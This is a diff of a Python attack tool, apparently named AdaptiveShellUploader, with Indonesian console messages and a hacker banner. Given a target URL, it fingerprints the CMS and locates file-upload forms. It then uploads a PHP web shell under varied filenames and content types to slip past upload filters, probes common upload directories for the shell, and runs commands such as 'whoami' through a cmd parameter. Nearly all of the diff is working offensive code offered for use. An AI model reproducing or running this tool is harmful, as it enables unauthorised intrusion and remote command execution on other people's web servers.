@@ -5,6 +5,21 @@ from urllib.parse import urljoin, urlparse
 import random
 import time
 
+def logo():
+  print("""
+  
+ ░▒▓███████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░      ░▒▓█▓▒░        
+░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░        
+░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░        
+ ░▒▓██████▓▒░░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓█▓▒░      ░▒▓█▓▒░        
+       ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░        
+       ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░        
+░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓████████▓▒░▒▓████████▓▒░ 
+                                                                   
+                                                                   
+""")
+print(logo())
+
 class AdaptiveShellUploader:
     def __init__(self, target_url):
         self.target_url = target_url if target_url.endswith('/') else target_url + '/'
@@ -80,7 +95,6 @@ class AdaptiveShellUploader:
 
             soup = BeautifulSoup(resp.text, 'html.parser')
 
-            # CMS Detection
             generator_meta = soup.find('meta', attrs={'name': 'generator'})
             if generator_meta and 'content' in generator_meta.attrs:
                 generator = generator_meta['content'].lower()
@@ -110,7 +124,6 @@ class AdaptiveShellUploader:
 
             print('[+] CMS terdeteksi:', self.cms)
 
-            # Upload Form
             forms = soup.find_all('form')
             for form in forms:
                 if form.find('input', {'type': 'file'}):
@@ -133,7 +146,6 @@ class AdaptiveShellUploader:
                         except:
                             continue
 
-            # Fallback Regex
             if not self.upload_form and re.search(r'<form[^>]+>.*?type=[\'"]?file[\'"]?', resp.text, re.I | re.S):
                 self.upload_form = soup.find('form', string=re.compile(r'type=["\']?file["\']?', re.I))
                 print('[+] Form upload ditemukan dengan regex scanning.')
@@ -171,84 +183,90 @@ class AdaptiveShellUploader:
         else:
             print('[!] Tidak ada jalur upload yang jelas, hentikan eksekusi.')
             return None
-
     def generate_shell_file(self, filename, content_type):
         from io import BytesIO
-        shell = BytesIO(self.shell_payload['php'].encode())
-        shell.name = filename
-        return (filename, shell, content_type)
+        shell_content = self.shell_payload['php'].encode()
+        shell_file = BytesIO(shell_content)
+        shell_file.name = filename
+        return (filename, shell_file, content_type)
 
-    def try_upload(self):
-        action_type = self.decision_engine()
-        if not action_type:
+    def upload_shell(self):
+        strategy = self.decision_engine()
+        if not strategy:
+            print('[!] Tidak bisa menentukan strategi upload. Abort.')
             return
 
-        if action_type == 'laravel_upload':
-            paths = ['storage/', 'uploads/', 'public/', 'files/']
-            for folder in paths:
-                for fname in self.shell_payload['filename_variants']:
-                    url = urljoin(self.target_url, folder + fname)
-                    print('[*] Coba akses langsung:', url)
-                    try:
-                        r = self.session.get(url)
-                        if 'SHELL_OK' in r.text:
-                            print('[+] SHELL TERBACA DI:', url)
-                            return
-                    except:
-                        pass
+        try:
+            print(f'[*] Menjalankan strategi: {strategy}')
+            if strategy in ['wp_upload', 'generic_upload', 'bypass_upload']:
+                for variant in self.shell_payload['filename_variants']:
+                    for content_type in self.shell_payload['content_types']:
+                        file_tuple = self.generate_shell_file(variant, content_type)
+                        files = {'file': file_tuple}
+                        action = self.upload_form.get('action') or self.target_url
+                        action_url = urljoin(self.target_url, action)
+                        print(f'[*] Uploading ke: {action_url} dengan file: {variant}, type: {content_type}')
+                        resp = self.session.post(
+                            action_url,
+                            files=files,
+                            headers=self.get_random_headers(),
+                            proxies={"http": self.proxy, "https": self.proxy} if self.proxy else None
+                        )
 
-        elif action_type in ['wp_upload', 'generic_upload', 'bypass_upload']:
-            try:
-                upload_url = self.upload_form.get('action')
-                method = self.upload_form.get('method', 'post').lower()
-                full_upload_url = urljoin(self.target_url, upload_url)
-
-                headers = self.get_random_headers()
-
-                for fname in self.shell_payload['filename_variants']:
-                    for ctype in self.shell_payload['content_types']:
-                        print(f'[*] Uploading {fname} dengan tipe {ctype} ke {full_upload_url}')
-                        files = {
-                            'file': self.generate_shell_file(fname, ctype)
-                        }
-                        try:
-                            if method == 'post':
-                                resp = self.session.post(full_upload_url, files=files, headers=headers, timeout=15)
+                        if 'SHELL_OK' in resp.text or resp.status_code == 200:
+                            shell_path = self.find_shell_path(variant)
+                            if shell_path:
+                                print(f'[+] Shell berhasil diupload di: {shell_path}')
+                                self.possible_shell_paths.append(shell_path)
+                                return
                             else:
-                                resp = self.session.get(full_upload_url, files=files, headers=headers, timeout=15)
+                                print('[!] Upload berhasil, tapi shell tidak ditemukan.')
+            elif strategy == 'laravel_upload':
+                for folder in ['storage', 'uploads', 'public', 'files', 'tmp']:
+                    for variant in self.shell_payload['filename_variants']:
+                        try:
+                            upload_url = urljoin(self.target_url, f"{folder}/{variant}")
+                            print(f'[*] Menguji akses ke: {upload_url}')
+                            resp = self.session.get(upload_url, timeout=5)
+                            if 'SHELL_OK' in resp.text:
+                                print(f'[+] Shell Laravel ditemukan di: {upload_url}')
+                                self.possible_shell_paths.append(upload_url)
+                                return
+                        except:
+                            continue
+        except Exception as e:
+            print(f'[!] Upload gagal: {e}')
 
-                            possible_path = re.findall(r"(?:href|src)=[\"'](.*?%s)[\"']" % fname, resp.text)
-                            if possible_path:
-                                shell_url = urljoin(self.target_url, possible_path[0])
-                                check = self.session.get(shell_url)
-                                if 'SHELL_OK' in check.text:
-                                    print('[+] SHELL TERUPLOAD:', shell_url)
-                                    return
-                        except Exception as e:
-                            print('[!] Upload gagal:', str(e))
+    def find_shell_path(self, filename):
+        guessed_paths = [
+            'uploads/', 'files/', 'images/', 'media/', 'content/', 'public/', 'wp-content/uploads/'
+        ]
+        for path in guessed_paths:
+            shell_url = urljoin(self.target_url, path + filename)
+            try:
+                resp = self.session.get(shell_url, timeout=5)
+                if 'SHELL_OK' in resp.text:
+                    return shell_url
+            except:
+                continue
+        return None
 
-            except Exception as e:
-                print('[!] Gagal parsing form upload:', str(e))
+    def exec_shell(self, cmd='id'):
+        for path in self.possible_shell_paths:
+            try:
+                print(f'[*] Mencoba eksekusi shell: {path}?cmd={cmd}')
+                resp = self.session.get(f'{path}?cmd={cmd}', timeout=5)
+                if resp.status_code == 200 and 'SHELL_OK' in resp.text:
+                    print('[+] Output dari shell:')
+                    print(resp.text)
+                    return
+            except:
+                continue
+        print('[!] Eksekusi shell gagal di semua path.')
 
-    def run(self):
-        self.recon()
-        self.try_upload()
-
-def logo1():
-    logo = """
-         ░▒▓███████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓████████▓▒░▒▓█▓▒░        
-       ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░        
-        ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░        
-         ░▒▓██████▓▒░░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓██████▓▒░ ░▒▓█▓▒░        
-               ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░        
-               ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░        
-        ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓████████▓▒░▒▓████████▓▒░ 
-
-                     Create by Saldy — My Name Hacked Kemi
-    """
-    print(logo)
-if __name__ == "__main__":
-    logo1()
-    target = input("Masukkan target URL (cth: http://example.com): ")
+if __name__ == '__main__':
+    target = input('[?] Masukkan URL target (contoh: http://target.com/): ').strip()
     uploader = AdaptiveShellUploader(target)
-    uploader.run()
+    uploader.recon()
+    uploader.upload_shell()
+    uploader.exec_shell('whoami')
